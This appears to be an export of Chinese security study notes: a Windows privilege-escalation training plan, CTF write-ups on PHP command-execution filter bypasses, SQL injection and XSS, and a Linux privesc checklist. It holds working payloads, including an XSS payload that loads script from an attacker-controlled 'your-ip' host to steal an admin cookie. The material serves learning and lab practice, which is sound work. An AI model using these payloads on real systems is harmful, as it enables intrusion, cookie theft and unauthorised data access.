本周成果检验：能否仅通过手动信息收集，准确预测自动化工具的主要发现？对比手动收集结果和自动化工具输出，总结差异和原因，形成检验报告。 本周总结：对本周所学内容进行系统总结，梳理知识框架，整理学习笔记，形成《第一周学习总结》文档，包括重点知识、实践操作经验、遇到的问题及解决方法等内容。 第二周：专项武器库打造Day 6 - 内核漏洞提权（一）：原理与方法论 上午 9:00-11:00 60min：学习缓冲区溢出和UAC绕过的基本原理，通过实际案例了解其攻击过程和原理，掌握关键知识点。 60min：研究常见的提权漏洞类型（本地权限提升类），分析不同漏洞类型的特点和利用方法，结合实际漏洞案例进行说明。 下午 14:00-18:00 90min：在Windows 7上手动复现MS17-010提权，按照漏洞利用步骤进行操作，记录每一步的操作过程和遇到的问题及解决方法，确保提权成功。 90min：学习使用Watson进行漏洞匹配，了解其使用方法和原理，通过实际漏洞进行匹配测试，验证其准确性。 今日产出：第一个成功的内核漏洞提权实例（包括漏洞复现过程、利用代码、提权结果等），漏洞利用过程记录（详细描述每一步操作和关键点）。 Day 7 - 内核漏洞提权（二）：现代环境适应 上午 9:00-11:00 60min：分析为什么新版Windows更难利用内核漏洞，从系统安全机制、漏洞修复策略等方面进行分析，结合实际案例进行说明。 60min：学习WES-NG工具的使用方法，了解其功能和优势，通过实际操作熟悉其使用流程。 下午 14:00-18:00 120min：在Windows 10环境下尝试多个CVE漏洞利用，选择不同类型的漏洞进行测试，记录每个漏洞的利用过程和结果，分析成功和失败的原因。 60min：总结内核漏洞在不同系统中的适用性规律，结合实际测试结果进行分析，形成《内核漏洞 复制 分享 快速参考指南》初稿。 今日产出：个人整理的《内核漏洞快速参考指南》（包括漏洞类型、适用系统、利用方法、注意事项等内容），漏洞利用测试报告（详细记录每个漏洞的测试过程和结果）。 Day 8 - 服务提权艺术 上午 9:00-11:00 60min：深入理解Windows服务控制管理器(SCM)，了解其架构和工作原理，掌握服务的启动、停止、配置等操作方法。 60min：分析三类服务提权手法的根本区别（如未引用服务路径、弱文件权限、服务权限配置不当等），通过实际案例进行说明，理解每种手法的原理和适用场景。 下午 14:00-18:00 90min：手动创建一个存在“未引用服务路径”的服务并利用，按照服务创建、配置、提权的步骤进行操作，记录每一步的操作过程和结果，确保提权成功。 90min：通过弱文件权限替换服务二进制文件提权，选择合适的服务进行测试，记录文件替换过程和提权结果，分析该手法的隐蔽性和风险点。 今日产出：服务提权的“三板斧”流程图解（包括未引用服务路径、弱文件权限、服务权限配置不当三种手法的详细流程图），服务提权实践报告（详细描述每种手法的实践过程和结果）。 Day 9 - 令牌窃取魔法 上午 9:00-11:00 60min：彻底搞懂Windows令牌的工作原理，通过实际操作查看令牌信息，结合文档理解令牌在用户认证和权限管理中的作用。 60min：分析为什么某些服务账户具备模拟特权，从服务的运行机制、权限配置等方面进行分析，结合实际案例进行说明。 下午 14:00-18:00 60min：学习并实践PrintSpoofer提权，按照工具使用说明进行操作，记录提权过程和结果，分析其原理和适用场景。 60min：研究Juicy Potato的历史演变和适用条件，了解其发展历程和不同版本的特点，通过实际测试验证其适用条件和提权效果。 今日产出：令牌模拟攻击的条件检查清单（包括PrintSpoofer、Juicy Potato等工具的适用条件、攻击步骤、注意事项等内容），令牌窃取实践报告（详细描述每种工具的实践过程和结果）。 Day 10 - 注册表与凭据世界 上午 9:00-11:00 60min：学习Windows凭据存储的各种位置（如内存、注册表、文件系统等），了解不同存储位置的特点和安全性，通过实际查看凭据存储位置进行验证。 60min：理解MSI安装包的权限提升机制，分析其原理和利用方法，结合实际案例进行说明。 下午 14:00-18:00 90min：配置并利用AlwaysInstallElevated提权，按照配置步骤进行操作，记录提权过程和结果，分析该漏洞的利用条件和风险点。 90min：Mimikatz从入门到精通：各模块详解，通过实际操作熟悉Mimikatz的各个模块功能（如dump密码、提权、模拟等），结合实际案例进行分析，总结其使用方法和注意事项。 今日产出：凭据提取的“藏宝地图”（包括凭据存储位置、提取方法、工具使用等内容），注册表与凭据实践报告（详细描述AlwaysInstallElevated提权和Mimikatz使用过程及结果）。 本周总结 对本周所学内容进行系统总结，梳理知识框架，整理学习笔记，形成《第二周学习总结》文档，包括重点知识、实践操作经验、遇到的问题及解决方法等内容。 对本周的实践成果进行整理和总结，形成《第二周实践成果报告》，包括漏洞利用实例、服务提权流程、令牌窃取实践、注册表与凭据实践等内容，突出实践过程和结果，为后续学习提供参考。 第三周：战术融合与实战淬炼Day 11 - HackTheBox实战（一） 上午 9:00-11:00 60min：选择一个简单难度的Windows靶机（如Legacy），熟悉靶机的基本情况和攻击目标，分析可能的攻击路径和方法。 60min：制定详细的攻击方案和时间预估，包括信息收集、漏洞利用、权限提升等各个环节的步骤和时间安排，确保攻击过程有条不紊。 下午 14:00-18:00 180min：专注攻克选定的HTB靶机，严格执行攻击方案和方法论，记录攻击过程中的每一步操作和遇到的问题及解决方法，确保攻击成功。 今日产出：第一台独立攻克的CTF靶机报告（包括靶机基本情况、攻击方案、攻击过程、遇到的问题及解决方法、收获与总结等内容），报告格式规范，内容详细准确。 Day 12 - HackTheBox实战（二） 上午 9:00-11:00 120min：分析昨天靶机的信息收集数据，提炼模式识别能力，总结信息收集的关键点和方法，分析不同信息之间的关联和潜在漏洞线索，形成信息收集分析报告。 下午 14:00-18:00 180min：选择中等难度靶机（如Optimum），运用全部所学知识和技能进行攻击，注重攻击过程中的方法论应用和问题解决能力，记录攻击过程和结果，确保攻击成功。 今日产出：克服障碍、解决问题的过程记录（详细描述在攻击过程中遇到的困难和挑战，以及解决这些问题的方法和思路），中等难度靶机攻击报告（包括靶机基本情况、攻击方案、攻击过程、遇到的问题及解决方法、收获与总结等内容）。 Day 13 - TryHackMe深度体验 上午 9:00-11:00 60min：适应TryHackMe平台的界面和工作流，熟悉平台的操作流程和功能模块，了解平台提供的学习资源和靶机类型。 60min：完成“Windows Fundamentals”或类似模块，通过学习模块内容，巩固Windows系统基础知识和安全技能，为后续靶机攻击做好准备。 下午 14:00-18:00 180min：在TryHackMe上选择2台不同类型的Windows靶机，按照平台要求进行攻击，注重攻击过程中的方法论应用和技能提升，记录攻击过程和结果，对比不同平台靶机的特点和攻击方法。 今日产出：跨平台作战的经验总结（包括不同平台靶机的特点、攻击方法的异同、遇到的问题及解决方法等内容），两台靶机攻击报告（分别包括靶机基本情况、攻击方案、攻击过程、遇到的问题及解决方法、收获与总结等内容）。 Day 14 - 防御视角与知识整合 上午 9:00-11:00 60min：学习如何通过组策略禁用危险的用户权限，了解组策略的配置方法和权限管理机制，通过实际操作进行验证，掌握禁用危险权限的方法和步骤。 60min：研究AppLocker的基本防护原理，了解其功能和作用，通过实际配置和测试验证其防护效果，掌握AppLocker的使用方法和配置要点。 下午 14:00-18:00 120min：为本周攻克的每一台靶机撰写详细的渗透测试报告，按照规范的报告格式进行撰写，包括靶机基本情况、攻击方案、攻击过程、漏洞分析、修复建议等内容，确保报告内容详细准确、逻辑清晰。 60min：整理前三周的所有笔记，创建索引，按照知识模块进行分类整理，形成系统的知识体系，方便后续查阅和复习。 60min：制作个人版的《Windows提权速查手册》，总结Windows提权的各种方法和技巧，包括漏洞利用、服务提权、令牌窃取、注册表与凭据等内容，形成一本实用的速查手册，方便随时查阅。 今日产出：本周攻克的每一台靶机的渗透测试报告（内容详细准确、格式规范），整理后的学习笔记（分类清晰、索引明确），个人版的《Windows提权速查手册》（内容实用、格式简洁）。 更新: 2025-11-03 15:16:23原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/ogulwxmt6ygblmgu"},{"path":"/wiki/WP/REC/linux标准输入输出.html","content":"linux标准输入输出web42if(isset($_GET[c])) $c=$_GET[c]; system($c. /dev/null 21);else highlight_file(__FILE__); 知识点 devnull 210 标准输⼊1 标准输出2 错误输出在类Unix系统中,/dev/null,或称空设备,是⼀个特殊的设备⽂件,它丢弃⼀切写⼊其中的数据(但报告写⼊操作成功)区别：2/dev/null 把错误输出到空设备（即丢弃）/dev/null 21 相当于1/dev/null 21 即把标准输出丢弃，并且把错误输出输出到标准输出。合计起来就是错误和标准输出都输出到空设备21 /dev/null 错误输出到标准输出，即输出到屏幕上，⽽标准输出被丢弃重定向 和 前者会先清空⽂件，然后再写⼊内容，后者会将重定向的内容追加到现有⽂件的尾部. 解题关键点 分割：| || ?c=tac flag |ls; 更新: 2025-09-06 15:37:07原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/c81ffd9ef56e342d6024caae6b4d0a56"},{"path":"/wiki/WP/REC/无参数REC.html","content":"无参数REC代码if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\（|\\）|\\-|\\=|\\+|\\|\\[|\\]|\\|\\:|\\|\\|\\,|\\|\\.|\\|\\/|\\?|\\\\\\\\/i, $c)) eval($c); else highlight_file(__FILE__); 常见绕过姿势getallheaders()：返回所有的HTTP头信息，返回的是数组⽽eval要求为字符串，所以要⽤implode()函数将数组转换为字符串get_defined_vars()：该函数的作⽤是获取所有的已定义变量，返回值也是数组，不过是⼆维数组，⽤var_dump()输出可以看⻅输出的内容，看⻅在第⼏位之后，可以⽤current()函数来获取其值，详细可以看官⽅函数。payload：var_dump(current(get_defined_vars()));session_id()：session_id()可以⽤来获取/设置当前会话 ID，可以⽤这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。 如可以在cookie中设置 PHPSESSID=706870696e666f28293b，然后⽤hex2bin()函数，即传⼊?exp=eval(hex2bin(session_id(session_start()))); 并设置cookie：PHPSESSID=706870696e666f28293b session_start 函数是为了开启session配合使⽤的函数：print_r(scandir(‘.’)); 查看当前⽬录下的所有⽂件名 var_dump()localeconv() 函数返回⼀包含本地数字及货币格式信息的数组。current() 函数返回数组中的当前元素（单元）,默认取第⼀个值，pos是current的别名each() 返回数组中当前的键/值对并将数组指针向前移动⼀步end() 将数组的内部指针指向最后⼀个单元next() 将数组中的内部指针向前移动⼀位prev() 将数组中的内部指针倒回⼀位array_reverse() 以相反的元素顺序返回数组 payload1?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv()))))); 解释?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));：这是一个GET请求的参数c，其值是一个PHP表达式。echo：PHP中的输出函数，用于输出字符串或表达式的结果。highlight_file：PHP中的函数，用于高亮显示PHP文件的内容。next：PHP中的函数，用于将内部指针向前移动到下一个元素。array_reverse：PHP中的函数，用于反转数组元素的顺序。scandir：PHP中的函数，用于列出目录中的文件和子目录。pos：PHP中的函数，返回数组中当前内部指针指向的值。localeconv()：PHP中的函数，返回本地化的数字和货币格式信息。 具体来说，这段代码的执行流程如下：localeconv()：获取本地化的数字和货币格式信息。pos(localeconv())：获取localeconv()返回数组中当前内部指针指向的值。scandir(pos(localeconv()))：列出pos(localeconv())指向的目录中的文件和子目录。array_reverse(scandir(pos(localeconv())))：反转这些文件和子目录的顺序。next(array_reverse(scandir(pos(localeconv()))))：将内部指针移动到下一个元素，即下一个文件或子目录。highlight_file(next(array_reverse(scandir(pos(localeconv())))))：高亮显示这个文件的内容。echo：输出这个高亮显示的内容。 payload2?c=eval(next(reset(get_defined_vars())));1=;system(tac%20flag.php); 解释?c=eval(next(reset(get_defined_vars())));：这是GET请求的一部分，其中c参数的值是一个PHP表达式。get_defined_vars()：这个函数返回当前所有已定义变量的数组，包括局部变量和全局变量。reset()：这个函数将数组内部指针指向第一个元素，并返回该元素的值。next()：这个函数将数组内部指针向前移动一位，并返回当前指针处的元素值。eval()：这个函数执行字符串作为PHP代码。这段代码的目的是尝试执行get_defined_vars()返回的第一个元素的下一个元素的值作为PHP代码。1=;system(tac%20flag.php);：这是GET请求的另一部分，尝试通过URL参数执行系统命令。system()：这个函数执行一个shell命令，并将完整的输出返回。tac%20flag.php：这里的命令是tac flag.php，tac是反向输出文件内容的Unix命令，%20是URL编码的空格。这段代码的目的是尝试执行flag.php文件的反向内容。 payload3题解，查看当前工作目录getcwd()，扫描当前目录及文件scandir()输出 为数组，flag.php 在倒数第二个个位置那就数组倒置array_revers()，变为正数第二，在使用next()函数指向从第一个指向第二个（及指向flag.php）,最后使用show_source（）查看文件的内容 ?c=print_r(show_source(next(array_reverse(scandir(getcwd())))));url+?c=print_r(getcwd()); === /var/www/htmlurl+?c=print_r(scandir(getcwd())); === Array ( [0] = . [1] = .. [2] = flag.php [3] = index.php )url+?c=print_r(array_reverse(scandir(getcwd()))); == Array ( [0] = index.php [1] = flag.php [2] = .. [3] = . )url+?c=print_r(next(array_reverse(scandir(getcwd())))); == flag.phpurl+?c=print_r(show_source(next(array_reverse(scandir(getcwd()))))); == $flag=ctfshoweca2e7df-d196-4b71-9632-ad4d32e194d3; 读取目录getallheaders()：返回所有的HTTP头信息，返回的是数组⽽eval要求为字符串，所以要⽤implode()函数将数组转换为字符串get_defined_vars()：该函数的作⽤是获取所有的已定义变量，返回值也是数组，不过是⼆维数组，⽤var_dump()输出可以看⻅输出的内容，看⻅在第⼏位之后，可以⽤current()函数来获取其值，详细可以看官⽅函数。payload：var_dump(current(get_defined_vars()));session_id()：session_id()可以⽤来获取/设置当前会话 ID，可以⽤这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。 如可以在cookie中设置 PHPSESSID=706870696e666f28293b，然后⽤hex2bin()函数，即传⼊?exp=eval(hex2bin(session_id(session_start()))); 并设置cookie：PHPSESSID=706870696e666f28293b session_start 函数是为了开启session配合使⽤的函数：print_r(scandir(‘.’)); 查看当前⽬录下的所有⽂件名 var_dump()localeconv() 函数返回⼀包含本地数字及货币格式信息的数组。current() 函数返回数组中的当前元素（单元）,默认取第⼀个值，pos是current的别名each() 返回数组中当前的键/值对并将数组指针向前移动⼀步end() 将数组的内部指针指向最后⼀个单元next() 将数组中的内部指针向前移动⼀位prev() 将数组中的内部指针倒回⼀位array_reverse() 以相反的元素顺序返回数组 更新: 2025-09-06 15:37:09原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/f2d4c4d90f4777451373a9e4026735bd"},{"path":"/wiki/WP/REC/获取目录.html","content":"获取目录函数 更新: 2025-09-06 15:37:11原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/a7570f73596f72ec5601042fa4f0eedc"},{"path":"/wiki/WP/REC/无字母.html","content":"无字母知识点bin为binary的简写，主要放置⼀些系统的必备执⾏档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。我们⽇常直接使⽤的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls 更新: 2025-09-06 15:37:10原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/753bebc06eb51735e9593a92765060f7"},{"path":"/wiki/WP/REC/读取文件.html","content":"读取文件函数highlight_file($filename);show_source($filename);require($filename)print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); // var_dumpfread(fopen($filename,r), $size);include($filename); // ⾮php代码include_once($filename); // ⾮php代码require($filename); // ⾮php代码require_once($filename); // ⾮php代码print_r(fread(popen(cat flag, r), $size));print_r(fgets(fopen($filename, r))); // 读取⼀⾏fpassthru(fopen($filename, r)); // 从当前位置⼀直读取到 EOFprint_r(fgetcsv(fopen($filename,r), $size));print_r(fgetss(fopen($filename, r))); // 从⽂件指针中读取⼀⾏并过滤掉 HTML 标记print_r(fscanf(fopen(flag, r),%s));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组print_r(glob(*)); // 列当前⽬录print_r(glob(/*)); // 列根⽬录print_r(scandir(.));print_r(scandir(/));$d=opendir(.);while(false!==($f=readdir($d)))echo$f ;$d=dir(.);while(false!==($f=$d-read()))echo$f. ;$a=glob(/*);foreach($a as $value)echo $value. ;$a=new DirectoryIterator(glob:///*);foreach($a as $f)echo($f-__toString(). ); 更新: 2025-09-06 15:37:13原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/6520d1e873502ded021179beb5bb9eb1"},{"path":"/wiki/WP/sql注入/杂项知识点.html","content":"杂项知识点分类1. MD5注入 md5($password,true) md5(string,raw) 参数 描述string\t必需。要计算的字符串。 raw 可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串 ffifdyop字符串会造成漏洞。md5(ffifdyop,true)=’or’6xxxxxx因此传入ffifdyop之后，数据库查询语句变为：select * from ‘admin’ where password= or ’6xxxxxx ’ ，变成 ‘’ or 6 MD5返回的16进制数时 出现不符合标准格式的十六进制数、不符合预期的长度、包含特殊情况或错误等情况下，会返回二进制数，经浏览器编码情况下，会变成奇怪的字符，经过不断尝试后，发现某些特定字符被mysql解析成万能密码的格式、如129581926211651571912466741651878684928、ffifdyop，但这里不能用数字型，因为限制密码长度了在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。 2.with rollupusername=admin//or//1=1//group//by//password//with/**/rollup#password= 加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足$password==$row[password]的限制成功登陆with rollup 是对分组后的结果进行聚合求和，在最后一行生成求和的数据。但是如果当前列是字符串无法求和的话，求和结果就会变成NULL 3.过滤了 information_schema.tables 和information_schema.columns方法一：反引号绕过 information_schema.`tables` 和 information_schema.`columns` 方法二：找平替表+无列名查询 比如ysql.innodb_table_stats (由于mysql版本不同，可利用的表也不一样) select * from users as a join users as b; 会出现a表和b表拼接成一个新表 再对其使用一个select查询进行包裹，由于会出现多个相同的列名，那么他就会报错。就可以利用此特性进行sql注入查询列名。 select * from (select * from users as a join users as b) as c; 当查询完第一个列名时，使用using排除，继续查询下一个列名。 select * from (select * from users as a join users as b using(id)) as c;实操： ?id=0 union select * from (select * from users as a join users as b) as c --+ （会显示出id） ?id=0 union select * from (select * from users as a join users as b using(id)) as c --+ （会显示出username） ?id=0 union select * from (select * from users as a join users as b using(id，username)) as c --+(会显示出第三列，以此类推) 更新: 2025-09-06 15:37:15原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/6aee1bbe4867d478ce15941ba2957776"},{"path":"/wiki/WP/sql注入/绕过select,堆叠.html","content":"绕过select,堆叠2019强网杯”随便注”一看就是sql注入首先判断是数字还是字符注入， 输入 1 ，2，反应正常， 输入2-1 ，结果回显2 的内容，排除数字注入 输入1’ 报错，那就是 select * from database ·····id’1’; 然后就是看列数； 1’ order by 2 –+ 回显正常， order by 3–+异常，那就是两列 然后正常的注入 1’ union select 1,2 –+,发现 preg_match(“select|update|delete|drop|insert|where|.i select 等被ban 了通过报错来查看数据库，等信息 2’ and extractvalue(1,concat(0x7e,(version()),0x7e))–+ 然后可以用堆叠注入，来显示其他信息 内容就在 # supersqli 内容就在 1919810931114514怎么得到里面的内容呢？ 方法一 ：使用handlerHANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name = | = | = | | (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name FIRST | NEXT | PREV | LAST [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ FIRST | NEXT [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。 通过HANDLER tbl_name CLOSE来关闭打开的句柄。 方法二：使用预处理语句set用于设置变量名和值prepare用于预备一个语句，并赋予名称，以后可以引用该语句execute执行语句deallocate prepare用来释放掉预处理的语句-1;set @sql = CONCAT(se,lect * from `1919810931114514`;);prepare stmt from @sql;EXECUTE stmt;结果为strstr($inject, set) strstr($inject, prepare) 这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。-1;Set @sql = CONCAT(se,lect * from `1919810931114514`;);Prepare stmt from @sql;EXECUTE stmt; 方法三：使用rename 和 alter我们使用rename和alter这两个命令来更改表名和字段名。因为我们可以访问words里的columns，发现id，也就是说我们输入的1默认是查询words这个表的。因此我们可以把words表改名成words1表，把1919810931114514表改名成words，然后再把1919810931114514里面的flag字段改名成id，然后输入1’ or 1=1#就可以成功得到flag了。 修改表名(将表名user改为users)alter table user rename to users;修改列名(将字段名username改为name)alter table users change uesrname name varchar(30);1;alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);然后使用 1 or 1=1 更新: 2025-09-06 15:37:17原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/48e68734b5fe946ef3309bfc47028cb9"},{"path":"/wiki/内网/提权/Lin_信息收集.html","content":"Lin_信息收集 项目（Item） 命令检查项（CommandCheck） 目的（Purpose） 注意事项（Notes） 风险等级（LowHigh） 行动建议（概念级） 系统与内核（System Kernel） uname -a 确定 OS 发行版、运行内核版本 vs 已安装内核版本（检测内核漏洞可能性） 关注内核版本是否存在已知提权漏洞（如 CVE-2021-4034 对应内核版本范围） High 对比 exploit-db 排查是否存在匹配内核漏洞；优先更新内核 当前身份与登录（Current Identity Logins） id；last 定位用户账户、最近登录记录，识别潜在闲置账户或特权账户（如 uid=0 的 root） 检查是否存在 sudo 权限用户或 wheel 组成员 High 审计非活跃账户，限制特权用户登录来源 SUIDSGID 文件（SUIDSGID Files） find / -perm -4000 2/dev/null；find / -perm -2000 2/dev/null 查找具有 SUIDSGID 权限的二进制文件（可能被滥用提权） 结合 GTFOBins 检查文件是否存在已知滥用方法（如 find nmap 等） High 移除不必要的 SUIDSGID 权限，使用 chmod u-s Capabilities 权限 getcap -r / 2/dev/null 查找具有 POSIX Capabilities 的文件（如 CAP_SYS_ADMIN 可能导致提权） 关注 cap_setuid+ep 等高风险权限，例如 python3 = cap_setuid+ep High 使用 setcap -r 文件 移除危险 Capabilities 进程信息（Processes） ps -eo pid,user,cmd,exe 识别特权进程（如 root 运行的服务）及可执行文件路径 检查进程是否存在命令注入漏洞或可写的可执行文件 Medium 限制进程权限，使用 chroot 或容器隔离高危服务 文件系统权限（Filesystem） ls -la /；mount 检查粘性位（sticky bit）、noexecnosuid 挂载选项、可写目录（如 /tmp 权限） /tmp 若为 rwx 且无粘性位，可能存在文件覆盖风险；/etc/passwd 可写性需重点关注 High 对 /tmp 设置 sticky bit，对系统目录启用 nosuid 计划任务（Cron Scheduled Tasks） crontab -l；cat /etc/crontab 检查计划任务是否存在高风险脚本（如所有者为 root 但可被低权限用户修改的脚本） 关注 * * * * * 高频任务，及 sh /tmp/script.sh 等使用相对路径的命令 High 限制计划任务脚本权限为 root:root 600，避免使用相对路径 环境变量（Environment） echo $PATH；env 检查 PATH 是否包含可写目录（如 /tmp），可能导致命令劫持 若 PATH 中可写目录位于系统目录前（如 /tmp:/usr/bin），风险更高 Medium 清理 PATH 中的可写目录，使用绝对路径执行命令 Sudo 配置（Sudo Privilege Escalation） sudo -l 查找 sudo 配置错误（如无需密码的命令）及允许执行的命令（如 sudo vi sudo find） 结合 GTFOBins 检查允许的命令是否存在提权方法（如 sudo vi - :!bash） High 最小化 sudo 权限，禁止无密码执行敏感命令 认证日志（Auth Logs） cat /var/log/auth.log 2/dev/null 审计认证事件（如失败登录、sudo 提权尝试），识别可疑提权行为 关注 sudo: PAM authentication failure 或 root : TTY=pts/0 ; COMMAND=/bin/bash Medium 启用日志审计工具（如 auditd），监控敏感命令执行 已安装包（Installed Packages） dpkg -l（Debian）；rpm -qa（RHEL） 列出已安装包版本，排查已知漏洞版本（如 polkit 漏洞对应版本） 结合 CVE Details 或 nessus 检查包版本是否存在本地提权漏洞 High 更新: 2025-10-31 13:14:47原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/ll31bqy4c12lo3vf"},{"path":"/wiki/WP/REC/REC过滤.html","content":"REC过滤RECping -c 1 wwww.baidu.com ping -c 1 wwww.baidu.com 在命令执行有下面几种可能： 命令可控 比如我们可以控制ping这个字符串 参数可控 -c 可控 参数值可控 1和www.baidu.com 可控 整体可控，但是要突破过滤 我们遇到命令执行，需要首先判断可控的位置，然后针对性的绕过 可以用系统函数:system exec highlight system(‘ls’); exec() **exec()**默认没有回显,需要手动加上echo.而且只会回显出一行结果,因此常用第二个数组参数接收多行结果. payload:$arr=[]; echo exec(ipconfig,$arr); var_dump($arr); **shell_exec()**默认没有回显,需要手动加上echo,可以输出多行结果. payload:echo shell_exec(ipconfig); highlight 其他函数 passthru echo php伪协议 show_source passthru(‘ls’); 同 system echo tac config.php; PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。 - 伪协议:include(php://filter/read=convert.base64-encode/resource=config.php);- show_source(config.php); //和highlight_file() 一样，将指定 PHP 文件的源代码以高亮形式输出到浏览器或返回为字符串 2. 用get方式 ?c=echo \\`$_GET[1]`\\;1=tac config.php 构造system ?c=$a=sys;$b=tem;$d=$a.$b;$d(cat config.php); cat 被过滤：除了cat 还有 tac、more、 less、head、tail、nl、sed、sort、uniq、rev 文件本身被过滤，可以模糊匹配 con* ，也可以base64加密解密 ?c=$a=base64_decode(Y2F0IGNvbmZpZy5waHA=);passthru($a); Y2F0IGNvbmZpZy5waHA=是cat config.php的base64加密 如果；被禁，可以尝试闭合整个php代码 ? 参数是C 可以用$_GET[a] 来绕过 1.涉及到一个php的代码结构，.....②payload为：?c=include $_GET[a]?，等同于，php的最后一行代码可以省去分号.....③include函数包含文件，且题目是对参数c正则过滤，因此GET型传参a可以绕过，从而执行我们的伪协议文件命令，读取config.php文件：php://filter/convert.base64-encode/resource=./config.php④因此连起来构造的payload为： ?c=include $_GET[a]?a=php://filter/convert.base64-encode/resource=config.php2./?c=echo `$_GET[a]`?a=cat config.php 让其echo一个get请求，?闭合，请求内容为cat config.php 也可以用post来绕过：先?cecho $_POST[a\\];然后再用hackbar传参数 a cat config.php 只禁用了*和?常用通配符，还可以使用其他通配符[c1-c2],[!c1-c2],[list]等 payload：?cecho tac confi[g][!0-9]ph[p]; nginx 日志文件路径 varlognginxaccess.log 可以用 cvarlognginxaccess.log1system(“tac%2036d.php”); 来绕过c 的检测 print_r(glob(“*“)) : glob()函数返回匹配指定模式的文件名或目录。因此我们可以使用glob函数来查找文件，也可以实现目录的遍历 scandir()也可以，具体用法 :print_r(scandir(‘.‘)) ```## 文件包含的用处在php中利用该函数可以将其他文件引入当前php文件，被引入的文件里有php语句就能正常发挥作用可以先引入文件，再用中国蚁剑连接也可以直接用，参考12### 过滤空格```phpcat$IFSflag.txtcat$IFS$9flag.txt $IFS$1 也可以catflag.txt catflag.txt %0a代替换行，%09代替TAB键 过滤 ：可以先目录再查看 cd xxxx;cat xxx 更新: 2025-09-06 15:37:05原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/2814200c9f956a877d835e5f6bb87f1b"},{"path":"/wiki/WP/root-me/XSS--ServerSide(服务端).html","content":"XSS–Server Side(服务端)https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side进页面之后，发现可以生成信息，页面很熟悉，想到可以试试存储型sxx 发现，无论输入什么，都会返回 看到一个注册页面，试试，注册页面有没有注入点 注册之后，登录，看有没有会显示在页面上的(反射型xss特点，找页面回显的)， 说明first name 和last name 会回显 生成证书 说明可以从first name 和last name入手构造xss 然后构造payload scriptdocument.write(iframe src=file:///flag.txt/iframe);/script 获取flag 更新: 2025-10-23 17:45:18原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/yp85ok2h21pe2mcv"},{"path":"/wiki/WP/root-me/XSS-Reflected(反射型).html","content":"XSS - Reflected(反射型)直接看看有没有注入点 发现有个?pprices，尝试有没有注入点 报404，检查一波， 发现在链接内，可以构造一下 结果没反应，应该是被过滤掉了 发现onmousemove 和’ 可以用 但题目要求是admin 不会点击所有可疑的 XSS 链接 ，尝试本地构造隐形化xss,向服务器发送cookie， 服务器利用蓝莲花xss平台构建https://github.com/firesunCN/BlueLotus_XSSReceiver 生成本地js,构建payload 发现被过滤掉了,换种方式 ?pexp%27%20onmouseover%27(function(){var%20sdocument.createElement(%22script%22);s.src%22http://your-ip/myjs/test.js%22;document.head.appendChild(s)})()%27 给管理员提交你的报告，等待一段时间，就会返回内容，他会发送很多次，有时候没发过来，得多找一下 更新: 2025-10-23 18:14:58原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/pu4zpg9kl5475fa5"},{"path":"/wiki/内网/提权/Linux提权.html","content":"Linux提权基础知识信息收集操作系统| plain uname -a # 打印所有可用的系统信息 uname -r # 内核版本 uname -n # 系统主机名。 uname -m # 查看系统内核架构（64位/32位） uname -mrs # 查看系统内核架构（64位/32位） hostname # 系统主机名 cat /proc/version # 内核信息 cat /etc/*-release # 分发信息 cat /etc/issue # 分发信息 cat /proc/cpuinfo # CPU信息 cat /etc/lsb-release # Debian based cat /etc/redhat-release # Redhat based ls /boot | grep vmlinuz-\t# 内核版本 || — | 环境变量 plain env # 显示环境变量 set # 现实环境变量 echo %PATH # 路径信息 history # 显示当前用户的历史命令记录 pwd # 输出工作目录 cat /etc/profile # 显示默认系统变量 cat /etc/shells # 显示可用的shellrc cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout cat /proc/??/environ # ??表示两个符号 打印机服务 plain lpstat -a 用户和群组| plain cat /etc/passwd # 列出系统上的所有用户 cat /var/mail/root cat /var/spool/mail/root cat /etc/group # 列出系统上的所有组 grep -v -E ^# /etc/passwd | awk -F: $3 == 0 { print $1} # 列出所有的超级用户账户 whoami # 